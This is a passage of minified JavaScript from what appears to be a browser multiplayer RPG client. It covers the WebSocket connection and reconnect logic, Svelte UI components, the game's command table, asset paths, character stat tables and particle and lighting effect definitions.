            for (let e = 0, s = Cm.close.length; e < s; ++e)
                Cm.close[e](t)
        }
        , Dm = t => {
            Um(t.data.byteLength),
                t = Hr(t.data);
            const e = ho(t)
                , s = e && Cm[e.header];
            if (s)
                for (let e = 0, i = s.length; e < i; ++e)
                    s[e](t)
        }
        , Am = (t, e) => {
            Cm[t].push(e)
        }
        , Bm = t => {
            void 0 !== Em && 1 === Mm && Em.send(t)
        }
        , Rm = t => {
            void 0 === Em && (Em = new WebSocket("wss://" + t + "/play"),
                Em.binaryType = "arraybuffer",
                Em.onerror = Tm,
                Em.onopen = Pm,
                Em.onclose = Im,
                Em.onmessage = Dm,
                console.log("Connecting to game server"))
        }
        , zm = () => {
            void 0 !== Em && (Em.close(),
                Em = void 0)
        }
        ;
    let Fm = 0
        , Zm = 0;
    const Um = t => {
        const e = Th();
        Zm += t,
            e - Fm > 250 && (_m = 4 * Zm,
                Zm = 0,
                Fm = e,
                wm(_m))
    }
        ;
    function Lm(t) {
        let e, s, i, n, a, r, o = t[1] ? t[1] + "  " : "";
        const l = new hm({});
        let c = "askReconnect" === t[0] && Nm(t);
        return {
            c() {
                e = T("div"),
                    Ft(l.$$.fragment),
                    c && c.c(),
                    s = T("h5"),
                    i = P(o),
                    n = P("\n    0.30.4002 Live"),
                    B(s, "class", "version textgrey svelte-qe246z"),
                    B(e, "class", "l-ui container svelte-qe246z")
            },
            m(t, a) {
                M(t, e, a),
                    Zt(l, e, null),
                    c && c.m(e, null),
                    E(e, s),
                    E(s, i),
                    E(s, n),
                    r = !0
            },
            p(t, n) {
                "askReconnect" === t[0] ? c ? c.p(t, n) : (c = Nm(t),
                    c.c(),
                    c.m(e, s)) : c && (c.d(1),
                        c = null),
                    (!r || 2 & n) && o !== (o = t[1] ? t[1] + "  " : "") && F(i, o)
            },
            i(t) {
                r || (Et(l.$$.fragment, t),
                    ut(() => {
                        a || (a = Tt(e, dm, {}, !0)),
                            a.run(1)
                    }
                    ),
                    r = !0)
            },
            o(t) {
                Mt(l.$$.fragment, t),
                    a || (a = Tt(e, dm, {}, !1)),
                    a.run(0),
                    r = !1
            },
            d(t) {
                t && _(e),
                    Ut(l),
                    c && c.d(),
                    t && a && a.end()
            }
        }
    }
    function Nm(t) {
        let e, s;
        return {
            c() {
                e = T("div"),
                    e.textContent = "Reconnect",
                    B(e, "class", "btn primary reconnect svelte-qe246z")
            },
            m(i, n, a) {
                M(i, e, n),
                    a && s(),
                    s = A(e, "click", t[2])
            },
            p: i,
            d(t) {
                t && _(e),
                    s()
            }
        }
    }
    function Om(t) {
        let e, s, i = t[0] && Lm(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[0] ? i ? (i.p(t, s),
                    1 & s && Et(i, 1)) : (i = Lm(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function jm(t, e, s) {
        let i, n;
        m(t, Ne, t => s(4, i = t)),
            m(t, Le, t => s(1, n = t));
        let a = !0;
        Q(() => {
            "autoReconnect" == o && (document.hidden ? (s(0, o = !0),
                setTimeout(() => {
                    s(0, o = "autoReconnect")
                }
                    , 1e3)) : (a && setTimeout(r, 1e3),
                        a = !1))
        }
        );
        const r = async () => {
            a = !0,
                Le.update(t => !1),
                s(0, o = !0);
            try {
                if (!i)
                    throw null;
                const t = await fetch("api/user/join", {
                    method: "POST",
                    body: JSON.stringify({
                        id: i
                    })
                })
                    , e = await t.json();
                if (!e.world)
                    throw y(Ne, i = 0),
                    null;
                Le.set(e.world)
            } catch (t) {
                window.location.href = "/"
            }
        }
            ;
        let { active: o } = e;
        return t.$set = t => {
            "active" in t && s(0, o = t.active)
        }
            ,
            [o, n, r]
    }
    class qm extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, jm, Om, h, {
                    active: 0
                })
        }
    }
    function Xm(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    U(e, "cursor", t[1])
            },
            m(s, i) {
                M(s, e, i),
                    t[2](e)
            },
            p(t, [s]) {
                2 & s && U(e, "cursor", t[1])
            },
            i: i,
            o: i,
            d(s) {
                s && _(e),
                    t[2](null)
            }
        }
    }
    function Hm(t, e, s) {
        let i, n;
        function a(t) {
            at[t ? "unshift" : "push"](() => {
                s(0, n = t)
            }
            )
        }
        return m(t, ce, t => s(1, i = t)),
            J(() => {
                n.appendChild(Xu.gl.canvas),
                    n.appendChild(Xu.canvas2dElement)
            }
            ),
            [n, i, a]
    }
    class Km extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, Hm, Xm, h, {})
        }
    }
    function Wm(t) {
        let e, s, i, n, a;
        return {
            c() {
                e = T("div"),
                    s = T("img"),
                    B(s, "class", i = v(t[2].css) + " svelte-snq3jh"),
                    s.src !== (n = t[2].img) && B(s, "src", n),
                    B(e, "class", a = "container border " + t[2].border + " svelte-snq3jh"),
                    U(e, "top", t[1] + "px"),
                    U(e, "left", t[0] + "px")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, r) {
                4 & r && i !== (i = v(t[2].css) + " svelte-snq3jh") && B(s, "class", i),
                    4 & r && s.src !== (n = t[2].img) && B(s, "src", n),
                    4 & r && a !== (a = "container border " + t[2].border + " svelte-snq3jh") && B(e, "class", a),
                    2 & r && U(e, "top", t[1] + "px"),
                    1 & r && U(e, "left", t[0] + "px")
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Ym(t) {
        let e, s = t[2] && t[0] && t[1] && Wm(t);
        return {
            c() {
                s && s.c(),
                    e = D()
            },
            m(t, i) {
                s && s.m(t, i),
                    M(t, e, i)
            },
            p(t, [i]) {
                t[2] && t[0] && t[1] ? s ? s.p(t, i) : (s = Wm(t),
                    s.c(),
                    s.m(e.parentNode, e)) : s && (s.d(1),
                        s = null)
            },
            i: i,
            o: i,
            d(t) {
                s && s.d(t),
                    t && _(e)
            }
        }
    }
    function Vm(t, e, s) {
        let i, n, a;
        m(t, le, t => s(2, i = t));
        const r = t => {
            (i || n || a) && (i ? (s(0, n = t.clientX - 10),
                s(1, a = t.clientY - 10)) : (s(0, n = 0),
                    s(1, a = 0)))
        }
            ;
        return J(() => {
            document.addEventListener("mousemove", r, !1)
        }
        ),
            et(() => {
                document.removeEventListener("mousemove", r)
            }
            ),
            [n, a, i]
    }
    class Gm extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, Vm, Ym, h, {})
        }
    }
    function Qm(t, e, s) {
        const i = t.slice();
        return i[6] = e[s],
            i
    }
    function Jm(t) {
        let e, s = t[2].opts, i = [];
        for (let e = 0; e < s.length; e += 1)
            i[e] = sp(Qm(t, s, e));
        let n = null;
        return s.length || (n = tp()),
        {
            c() {
                e = T("div");
                for (let t = 0; t < i.length; t += 1)
                    i[t].c();
                n && n.c(),
                    B(e, "class", "panel context border grey"),
                    U(e, "left", t[2].x + "px"),
                    U(e, "top", t[2].y + "px")
            },
            m(s, a) {
                M(s, e, a);
                for (let t = 0; t < i.length; t += 1)
                    i[t].m(e, null);
                n && n.m(e, null),
                    t[5](e)
            },
            p(t, a) {
                if (5 & a) {
                    let r;
                    for (s = t[2].opts,
                        r = 0; r < s.length; r += 1) {
                        const n = Qm(t, s, r);
                        i[r] ? i[r].p(n, a) : (i[r] = sp(n),
                            i[r].c(),
                            i[r].m(e, null))
                    }
                    for (; r < i.length; r += 1)
                        i[r].d(1);
                    i.length = s.length,
                        s.length ? n && (n.d(1),
                            n = null) : n || (n = tp(),
                                n.c(),
                                n.m(e, null))
                }
                4 & a && U(e, "left", t[2].x + "px"),
                    4 & a && U(e, "top", t[2].y + "px")
            },
            d(s) {
                s && _(e),
                    C(i, s),
                    n && n.d(),
                    t[5](null)
            }
        }
    }
    function tp(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    e.textContent = "No options",
                    B(e, "class", "choice disabled")
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function ep(t) {
        let e, s, i;
        return {
            c() {
                e = T("img"),
                    i = I(),
                    B(e, "class", "svgicon"),
                    e.src !== (s = "/assets/ui/icons/" + t[6].icon + ".svg?v=4002247") && B(e, "src", s)
            },
            m(t, s) {
                M(t, e, s),
                    M(t, i, s)
            },
            p(t, i) {
                4 & i && e.src !== (s = "/assets/ui/icons/" + t[6].icon + ".svg?v=4002247") && B(e, "src", s)
            },
            d(t) {
                t && _(e),
                    t && _(i)
            }
        }
    }
    function sp(t) {
        let e, s, i, n, a = t[6].name + "", r = t[6].icon && ep(t);
        function o(...e) {
            return t[4](t[6], ...e)
        }
        return {
            c() {
                e = T("div"),
                    r && r.c(),
                    s = P(a),
                    B(e, "class", i = "choice " + (t[6].css || ""))
            },
            m(t, i, a) {
                M(t, e, i),
                    r && r.m(e, null),
                    E(e, s),
                    a && n(),
                    n = A(e, "click", o)
            },
            p(n, o) {
                (t = n)[6].icon ? r ? r.p(t, o) : (r = ep(t),
                    r.c(),
                    r.m(e, s)) : r && (r.d(1),
                        r = null),
                    4 & o && a !== (a = t[6].name + "") && F(s, a),
                    4 & o && i !== (i = "choice " + (t[6].css || "")) && B(e, "class", i)
            },
            d(t) {
                t && _(e),
                    r && r.d(),
                    n()
            }
        }
    }
    function ip(t) {
        let e, s = t[2] && Jm(t);
        return {
            c() {
                s && s.c(),
                    e = D()
            },
            m(t, i) {
                s && s.m(t, i),
                    M(t, e, i)
            },
            p(t, [i]) {
                t[2] ? s ? s.p(t, i) : (s = Jm(t),
                    s.c(),
                    s.m(e.parentNode, e)) : s && (s.d(1),
                        s = null)
            },
            i: i,
            o: i,
            d(t) {
                s && s.d(t),
                    t && _(e)
            }
        }
    }
    function np(t, e, s) {
        let i, n;
        m(t, Wt, t => s(2, i = t));
        const a = t => {
            t.target != n && t.target.parentNode != n && i && Wt.set(void 0)
        }
            , r = t => {
                t.fun(),
                    Wt.set(void 0)
            }
            ;
        J(() => {
            document.addEventListener("pointerdown", a, !1)
        }
        ),
            et(() => {
                document.removeEventListener("pointerdown", a)
            }
            );
        const o = t => r(t);
        function l(t) {
            at[t ? "unshift" : "push"](() => {
                s(1, n = t)
            }
            )
        }
        return [r, n, i, a, o, l]
    }
    class ap extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, np, ip, h, {
                    opt: 0
                })
        }
        get opt() {
            return this.$$.ctx[0]
        }
    }
    const rp = (t, e = "") => {
        Bm(ro.clientCommand.packData({
            command: t,
            string: e + ""
        }))
    }
        , op = {
            partyleave: {},
            partyinvite: {
                a: 1
            },
            partycreate: {},
            time: {},
            global: {
                a: 1,
                chat: !0
            },
            party: {
                a: 1,
                chat: !0
            },
            clan: {
                a: 1,
                chat: !0
            },
            faction: {
                a: 1,
                chat: !0
            }
        }
        , lp = {
            gaingold: {
                admin: !0,
                a: 1
            },
            gainmedals: {
                admin: !0,
                a: 1
            },
            setelo: {
                admin: !0,
                a: 1
            },
            die: {
                moderator: !0
            },
            statreset: {
                moderator: !0
            },
            testchar: {
                moderator: !0,
                a: 3
            },
            changeworld: {
                moderator: !0,
                a: 1
            },
            setfame: {
                admin: !0,
                a: 1
            },
            itemmove: {
                a: 2
            },
            itemdrop: {
                a: 1
            },
            itemuse: {
                a: 1
            },
            itemauctionpost: {
                a: 2
            },
            itemauctionfind: {
                a: 6
            },
            itemauctionbuy: {
                a: 1
            },
            itemauctioncancel: {
                a: 1
            },
            itemstash: {
                a: 1
            },
            itemunstash: {
                a: 1
            },
            itemsplithalf: {
                a: 1
            },
            itemsplitone: {
                a: 1
            },
            goldunstash: {
                a: 1
            },
            goldstash: {
                a: 1
            },
            itemtradersell: {
                a: 1
            },
            itemtraderbuy: {
                a: 1
            },
            itemblacksmithupgrade: {
                a: 1
            },
            statincrease: {
                a: 2
            },
            skillremove: {
                a: 1
            },
            respawn: {},
            startqueue: {
                a: 1
            },
            stopqueue: {
                a: 1
            },
            partyaccept: {
                a: 1
            },
            partydecline: {
                a: 1
            },
            partykick: {
                a: 1
            },
            partylink: {},
            partysetrole: {
                a: 2
            },
            summonaccept: {
                a: 1
            },
            whisper: {
                a: 2,
                chat: !0
            },
            ...op
        }
        , cp = [1600, 1800, 2e3, 2200]
        , hp = cp.length
        , dp = t => {
            for (let e = 0; e < hp; ++e)
                if (cp[e] > t)
                    return e;
            return Math.max(0, hp)
        }
        , up = 10
        , mp = 30
        , pp = 240
        , fp = -.0015
        , gp = 930
        , vp = 100
        , yp = t => up + Math.round(Math.max(t / mp, pp * (1 - Math.exp(fp * (t - gp))) - vp))
        , bp = [0, 0, 1, 1, 2, 3]
        , wp = (t, e) => "book" + (void 0 !== e ? e : "") + bp[t % 5]
        , xp = (t, e, s, i) => `/assets/items/${t}/${"book" == t ? wp(e, s) : t + e}_q${i}.${Ro}?v=4002247`
        , kp = t => `/assets/ui/skills/${t}.${Ro}?v=4002247`
        , $p = t => `/assets/ui/slotbg/${t}.${Bo}?v=4002247`
        , Sp = t => `/assets/ui/maps/${t}.${Ro}?v=4002247`
        , Ep = t => `/assets/ui/classes/${t}.${Bo}?v=4002247`
        , Mp = t => `/assets/ui/factions/${t}.${Bo}?v=4002247`
        , _p = () => "/assets/ui/icons/crown.svg?v=4002247"
        , Cp = t => `/assets/ui/elo/${dp(t)}.svg?v=4002247`
        , Tp = () => "/assets/ui/currency/medal.svg?v=4002247";
    function Pp(t) {
        let e, s;
        return {
            c() {
                e = T("img"),
                    B(e, "class", "icon svelte-erbdzy"),
                    e.src !== (s = "/assets/ui/icons/gem.svg?v=4002247") && B(e, "src", s)
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Ip(t) {
        let e, s, n, a, r, o, l, c, h = t[4] && Pp();
        return {
            c() {
                e = T("span"),
                    h && h.c(),
                    s = T("img"),
                    a = P(t[1]),
                    r = I(),
                    o = T("span"),
                    l = P(t[0]),
                    B(s, "class", "icon svelte-erbdzy"),
                    s.src !== (n = Ep(t[2])) && B(s, "src", n),
                    B(e, "class", "textwhite"),
                    B(o, "class", c = "name textf" + t[3] + " svelte-erbdzy")
            },
            m(t, i) {
                M(t, e, i),
                    h && h.m(e, null),
                    E(e, s),
                    E(e, a),
                    E(e, r),
                    M(t, o, i),
                    E(o, l)
            },
            p(t, [i]) {
                t[4] ? h || (h = Pp(),
                    h.c(),
                    h.m(e, s)) : h && (h.d(1),
                        h = null),
                    4 & i && s.src !== (n = Ep(t[2])) && B(s, "src", n),
                    2 & i && F(a, t[1]),
                    1 & i && F(l, t[0]),
                    8 & i && c !== (c = "name textf" + t[3] + " svelte-erbdzy") && B(o, "class", c)
            },
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    h && h.d(),
                    t && _(o)
            }
        }
    }
    function Dp(t, e, s) {
        let { name: i } = e
            , { level: n } = e
            , { pclass: a } = e
            , { faction: r } = e
            , { sub: o = !1 } = e;
        return t.$set = t => {
            "name" in t && s(0, i = t.name),
                "level" in t && s(1, n = t.level),
                "pclass" in t && s(2, a = t.pclass),
                "faction" in t && s(3, r = t.faction),
                "sub" in t && s(4, o = t.sub)
        }
            ,
            [i, n, a, r, o]
    }
    class Ap extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, Dp, Ip, h, {
                    name: 0,
                    level: 1,
                    pclass: 2,
                    faction: 3,
                    sub: 4
                })
        }
    }
    const Bp = (t, e, s, i) => {
        window.gtag && window.gtag("event", t, {
            event_category: e,
            event_label: s,
            value: i
        })
    }
        , Rp = [30, 60, 130, 260, 470, 700, 1030, 1500, 2100, 2900, 3900, 5400, 7200, 9600, 12600, 17400, 23700, 31900, 42600, 58300, 78900, 106e3, 14e4, 184e3, 247e3, 33e4, 43e4, 56e4, 73e4, 96e4, 125e4, 162e4, 209e4, 268e4, 4e6, 62e5, 97e5, 15e6, 229e5, 325e5, 451e5, 615e5, 827e5, 11e7, 1203e5]
        , zp = t => Rp[nr(t, 1, 45) - 1]
        , Fp = t => {
            const e = Object.entries(t);
            return e.forEach(t => {
                t[0] = parseInt(t[0]),
                    "object" == typeof t[1] && (t[1] = Fp(t[1]))
            }
            ),
                new Map(e)
        }
        ;
    var Zp = Fp({
        0: 10,
        1: 10,
        2: 10,
        3: 10,
        4: 10,
        5: 5,
        15: 97,
        17: 10,
        6: 100,
        7: 100,
        14: 50,
        9: 30,
        8: 20,
        12: 15
    });
    const Up = [31]
        , Lp = [8, 5, 40]
        , Np = Zp
        , Op = Fp({
            2: 1,
            1: 2
        });
    var jp = Object.freeze({
        __proto__: null,
        startSkills: Up,
        engineSkills: Lp,
        baseStats: Np,
        statPerLevel: Op
    });
    const qp = Zp
        , Xp = [4]
        , Hp = [8, 40]
        , Kp = Fp({
            3: 1,
            1: 2
        });
    var Wp = Object.freeze({
        __proto__: null,
        baseStats: qp,
        startSkills: Xp,
        engineSkills: Hp,
        statPerLevel: Kp
    });
    const Yp = Fp({
        0: 3,
        1: 5,
        2: 5,
        3: 5,
        5: 5,
        17: 50,
        15: 60,
        10: 1,
        11: 2,
        7: 100,
        9: 80,
        6: 10
    })
        , Vp = Fp({
            0: 1,
            12: 2,
            2: 4,
            10: .4,
            11: .4,
            6: 4
        })
        , Gp = Fp({
            12: .03,
            6: 5.3,
            10: .04,
            11: .05
        });
    var Qp = Object.freeze({
        __proto__: null,
        baseStats: Yp,
        statPerLevel: Vp,
        statPerLevelExponential: Gp
    });
    const Jp = Fp({
        0: 10,
        1: 10,
        2: 10,
        3: 10,
        4: 10,
        5: 10
    })
        , tf = Fp({
            0: 20,
            1: 20,
            2: 20,
            4: 20
        });
    var ef = Object.freeze({
        __proto__: null,
        baseStats: Jp,
        statPerLevel: tf
    });
    const sf = Zp
        , nf = [12]
        , af = [8, 0, 40]
        , rf = Fp({
            4: 1,
            1: 2
        });
    var of = Object.freeze({
        __proto__: null,
        baseStats: sf,
        startSkills: nf,
        engineSkills: af,
        statPerLevel: rf
    });
    const lf = Zp
        , cf = [1, 21]
        , hf = [8, 0, 40]
        , df = Fp({
            0: 1,
            1: 2
        });
    var uf = [Object.freeze({
        __proto__: null,
        baseStats: lf,
        startSkills: cf,
        engineSkills: hf,
        statPerLevel: df
    }), Wp, jp, of, ef, Qp];
    const mf = (t, e) => Math.ceil(t / 2) + uf[e].startSkills.length
        , pf = Fp({
            0: {
                6: 1,
                8: .5
            },
            1: {
                6: 4,
                12: 1
            },
            2: {
                14: .5
            },
            3: {
                14: .4,
                7: 1
            },
            4: {
                16: .3,
                7: 1
            },
            5: {
                14: .2,
                18: .5
            }
        })
        , ff = t => 1 + t / 1e3
        , gf = Object.keys({
            onBlock: 0,
            statsStatic: 0,
            statsConvert: 0,
            statsOverride: 0,
            onInterval: 0,
            multiplyIncomingHeal: 0,
            multiplyIncomingDamage: 0,
            addIncomingHeal: 0,
            addIncomingDamage: 0,
            addIncomingCrit: 0,
            afterDamageEnemy: 0,
            beforeDamageEnemy: 0,
            beforeIncomingDamage: 0,
            movementOverride: 0,
            incapacitated: 0,
            breakOnCast: 0,
            instantCast: 0,
            onCast: 0,
            onEnd: 0,
            onAffectedEnemyDeath: 0
        });
    class vf {
        constructor(t) {
            this.id = t.id,
                this.intervalHaste = !1 !== t.intervalHaste,
                this.intervalDuration = t.intervalDuration,
                this.maxStacks = t.maxStacks,
                this.passive = t.passive || !1,
                this.custom = t.custom,
                this.diminish = t.diminish || !1,
                this.type = t.type || 0,
                this.tags = t.tags || new Set,
                gf.forEach(e => {
                    this[e] = t[e]
                }
                ),
                this.icon = t.icon || "skills/0",
                this.visualIncapacitation = t.visualIncapacitation,
                this.fx = t.fx || {}
        }
        onSet(t, e, s) {
            this.tags.forEach(e => {
                s.tags.get(e).add(t)
            }
            ),
                gf.forEach(e => {
                    this[e] && s[e].add(t)
                }
                )
        }
        onRemove(t, e, s) {
            this.tags.forEach(e => {
                s.tags.get(e).delete(t)
            }
            ),
                gf.forEach(e => {
                    this[e] && s[e].delete(t)
                }
                )
        }
    }
    var yf = new vf({
        id: 63,
        passive: !0,
        statsStatic: (t, e) => {
            e.addStat(12, Math.round(40 + 20 * t.level)),
                e.addStat(25, Math.round(200 + 200 * t.level))
        }
    });
    const bf = [["white", "common"], ["green", "uncommon"], ["blue", "rare"], ["purp", "epic"]]
        , wf = t => t >= 90 ? 3 : t >= 70 ? 2 : t >= 50 ? 1 : 0
        , xf = t => bf[wf(t)]
        , kf = {
            black: or(0, 0),
            white: or(16777215, 0),
            deadgrey: or(3355443, 0),
            teal: or(3384995, 0),
            magicblue: or(3362252, 0),
            paleskin: or(14267315, 0),
            darkskin: or(8411481, 0),
            slimegreen: or(2542694, 0),
            mushgreen: or(2077529, 0),
            linen: or(13408614, 0),
            woodbrown: or(4859433, 0),
            woodbrown2: or(10250315, 0),
            tealsteel: or(3358797, .5),
            darksteel: or(3355443, .5),
            greysteel: or(5066061, .5),
            blacksteel: or(988178, .5),
            leather: or(4337198, 0),
            emerald: or(22866, -.1),
            gold: or(16751616, .9),
            paper: or(15129011, 0),
            richpurple: or(7484623, 0),
            fireorange: or(14715686, -.7),
            archergreen: or(10471258, 0),
            warbrown: or(15172191, 0),
            bronze: or(9258571, .5),
            silver: or(11583679, .6),
            shamanblue: or(3687924, 0),
            mageblue: or(6607340, 0),
            bone: or(14535066, .2),
            bone2: or(11836267, .2),
            ice: or(14610164, -.2),
            vanguard: or(2848511, 0),
            bloodlust: or(14289947, 0),
            pink: or(16711935, 0),
            warden: or(14755623, 0),
            evilred: or(13239043, 0),
            ruby: or(15733030, 1),
            moss: or(2925637, .2),
            rock: or(5006687, .4),
            death: or(3750201, .8),
            diamond: or(3076559, .9)
        }
        , $f = [kf.woodbrown, kf.bronze, kf.greysteel, kf.silver, kf.gold]
        , Sf = [kf.greysteel, kf.silver, kf.gold, kf.ruby, kf.diamond]
        , Ef = [kf.leather, kf.greysteel, kf.silver, kf.gold, kf.diamond]
        , Mf = function (t, e, s) {
            e % 10 == 0 && t.particle(s, Yo(-20, 20), Yo(-20, 0), Yo(-20, 10), 0, .3, 0)
        }
        , _f = {
            cityAmbience: {
                permanent: !0,
                Uk: {
                    QY: [.6, .3, .1],
                    size: 5e3
                }
            },
            mysticAmbience: {
                permanent: !0,
                Uk: {
                    QY: [0, .6, 0],
                    size: 5e3
                },
                tick: function (t) {
                    Mf(this, this.frame, Mh.floaterGreen)
                }
            },
            evilAmbience: {
                permanent: !0,
                Uk: {
                    QY: [.6, 0, 0],
                    size: 5e3
                },
                tick: function (t) {
                    Mf(this, this.frame, Mh.floaterRed)
                }
            },
            oceanAmbience: {
                permanent: !0,
                sound: {
                    loop: !0,
                    parent: !0,
                    id: "ambient_ocean",
                    distance: 100
                }
            },
            campfire: {
                permanent: !0,
                Uk: {
                    dynamic: !0,
                    QY: [2.5, 1.8, .3]
                },
                sound: {
                    loop: !0,
                    parent: !0,
                    id: "fireloop",
                    distance: 7
                },
                tick: function (t, e) {
                    if (this.time > .1 / this.transform.parent.scale[1] ** 2) {
                        this.time = 0;
                        const t = Yo(0, .4)
                            , e = this.particle(Mh.fire, Yo(-t, t), Yo(-.8, -.2), Yo(-t, t));
                        e && Vi(e.vel, 0, .6 * this.transform.parent.scale[1] - t, 0)
                    }
                    this.Uk.val[3] = 30 + Math.sin(t / 600) * Math.sin(t / 50) * 5
                }
            },
            torch: {
                permanent: !0,
                Uk: {
                    dynamic: !0,
                    QY: [1, .8, .4, 500]
                }
            },
            mystical01: {
                permanent: !0,
                Uk: {
                    QY: [.1, 1.4, 2],
                    size: 400,
                    dynamic: !0
                },
                sound: {
                    loop: !0,
                    parent: !0,
                    id: "mysticalSound",
                    distance: 14
                },
                tick: function (t, e) {
                    this.frame % 3 == 0 && this.particle(Mh.mystical, 0, 0, 0),
                        Qi(this.transform.position, this.origin, [3 * Math.sin(t / 600), 1 * Math.sin(t / 400), 3 * Math.cos(t / 600)]),
                        this.transform.rotation[1] = t / 600,
                        this.transform.rotationNeedsUpdate = !0,
                        this.transform.updateMatrixWorld(!0)
                }
            },
            meleeFlash: {
                time: -.3,
                timeout: 1,
                Uk: {
                    QY: [1, 1, 1],
                    size: 0,
                    dynamic: !0
                },
                tick: function (t, e) {
                    const s = .8 * Math.sin(8 * Math.max(0, Math.min(.39, 2 * this.time - .2)));
                    if (Xn(this.Uk.val, s, s, s, 100),
                        this.fraction(.2, e)) {
                        for (let t = 0; t < 3 * this.lod; ++t)
                            this.particle(Mh.meleeFlash, Yo(-.1, .1), .5, 0);
                        this.creature.transform.addPushBack(this.dir, 4)
                    }
                }
            },
            meleePhys: {
                time: -.3,
                timeout: 1,
                tick: function (t, e) {
                    if (this.fraction(.2, e)) {
                        dl({
                            transform: this.transform,
                            delay: .1,
                            id: "impact_flesh",
                            rnd: 3,
                            distance: 5
                        });
                        for (let t = 0; t < 4 * this.lod; ++t) {
                            const t = Yo(0, 1);
                            Vi(Oa, Yo(5 * -t, 5 * t), 10, Yo(5 * -t, 5 * t)),
                                sn(Oa, Oa, this.dir, -8),
                                this.particle(Mh.meleePhys, Yo(-.1, .1), .5, Yo(-.1, .1), Oa[0], Oa[1], Oa[2])
                        }
                    }
                }
            },
            meleeSlash: {
                time: -.4,
                timeout: .01,
                tick: function (t, e) {
                    if (0 === this.frame) {
                        this.creature.transform.addPushBack(this.dir, 4);
                        for (let t = 0; t < 8 * this.lod; ++t) {
                            const t = Yo(0, 1);
                            Vi(Oa, Yo(3 * -t, 3 * t), Yo(0, 10), Yo(3 * -t, 3 * t)),
                                sn(Oa, Oa, this.dir, -2),
                                this.particle(Mh.blood, Yo(-.2, .2), 0, Yo(-.2, .2), Oa[0], Oa[1], Oa[2])
                        }
                    }
                }
            },
            arrowImpact: {
                timeout: 1,
                Uk: {
                    QY: [1, 1, 1],
                    size: 0,
                    dynamic: !0
                },
                tick: function (t, e) {
                    const s = .8 * Math.sin(8 * Math.max(0, Math.min(.39, 2 * this.time - .2)));
                    if (Xn(this.Uk.val, s, s, s, 100),
                        this.fraction(.2, e)) {
                        for (let t = 0; t < 3 * this.lod; ++t)
                            this.particle(Mh.meleeFlash, Yo(-.1, .1), .5, 0);
                        this.creature.transform.addPushBack(this.dir, 4)
                    }
                }
            },
            arrowPreciseImpact: {
                timeout: 1,
                Uk: {
                    QY: [1, 1, 1],
                    size: 0,
                    dynamic: !0
                },
                tick: function (t, e) {
                    const s = .8 * Math.sin(8 * Math.max(0, Math.min(.39, 2 * this.time - .2)));
                    if (Xn(this.Uk.val, s, s, s, 100),
                        this.fraction(.2, e)) {
                        for (let t = 0; t < 3 * this.lod; ++t)
                            this.particle(Mh.meleeFlashBig, Yo(-.1, .1), .5, 0);
                        this.creature.transform.addPushBack(this.dir, 4)
                    }
                }
            },
            physBlock: {
                time: -.3,
                timeout: .5,
                Uk: {
                    QY: [1, 1, 1],
                    size: 0,
                    dynamic: !0
                },
                tick: function (t, e) {
                    const s = this.time > .2 ? 8 * Math.max(0, .5 - this.time) : 0;
                    if (Xn(this.Uk.val, s, s, s, 500),
                        this.fraction(0, e) && dl({
                            delay: .2,
                            distance: 5,
                            id: "block",
                            transform: this.transform
                        }),
                        this.fraction(.2, e)) {
                        this.particle(Mh.blockCircle);
                        for (let t = 0; t < 5 * this.lod; ++t)
                            this.particle(Mh.blockFlick, 0, 0, 0, Yo(-20, 20), Yo(5, 10), Yo(-20, 20));
                        this.creature.transform.addPushBack(this.dir, 4)
                    }
                }
            },
            potionConsume: {
                timeout: 2,
                tick: function (t, e) {
                    this.frame % 20 == 0 && (this.particle(Mh.healHolySoft, 0, .5, 0, Yo(-1, 1), Yo(.1, .3), Yo(-1, 1)),
                        this.particle(Mh.healHolySparkle, Yo(-1, 1), Yo(.1, .3), Yo(-.9, .9)))
                }
            },
            blockBuff: {
                particles: {
                    amount: 4,
                    info: Mh.blockBuffShield
                },
                tick: function (t, e) {
                    this.fraction(.1, e) && this.particle(Mh.blockBuffFocus),
                        this.particles.forEach((e, s) => {
                            const i = 1.55 * s + t / 500;
                            this.localize(e.Za, 1.3 * Math.sin(i), 0, 1.3 * Math.cos(i))
                        }
                        )
                }
            },
            removeCC: {
                timeout: 1.3,
                Uk: {
                    QY: [1, 1, 1],
                    size: 0,
                    dynamic: !0
                },
                tick: function (t, e) {
                    const s = 3 - this.time / 1.3 * 3;
                    Xn(this.Uk.val, .7 * s, .7 * s, s, 100),
                        0 === this.frame && (this.particle(Mh.removeCCFlash),
                            Cf(this, 8, 18, Mh.removeCC))
                }
            },
            iceBlockBuff: {
                mesh: {
                    id: "character/shield.ho",
                    color: [.3, .8, 1, -.5],
                    scale: [.3, .4, .4],
                    Za: [1.3, 0, 0],
                    rot: [0, Math.PI, 0]
                },
                particles: {
                    amount: 1,
                    info: Mh.iceglare
                },
                tick: function (t, e) {
                    const s = t / 400;
                    Vi(this.transform.rotation, 0, -s, 0),
                        this.transform.rotationNeedsUpdate = !0,
                        this.particles.forEach((t, e) => {
                            this.localize(t.Za, 1.3 * Math.cos(s - this.transform.parent.rotation[1]), 0, 1.3 * Math.sin(s - this.transform.parent.rotation[1]))
                        }
                        )
                }
            },
            healOnBlockBuff: {
                particles: {
                    amount: 1,
                    info: Mh.holyShield
                },
                tick: function (t, e) {
                    0 !== this.particles.length && this.localize(this.particles[0].Za, 0, .5, 0, 0, .5 + .05 * Math.sin(t / 200))
                }
            },
            blockEnrageBuff: {
                tick: function (t, e) {
                    this.time > .5 / Math.min(10, this.buff.stacks) && (this.time = 0,
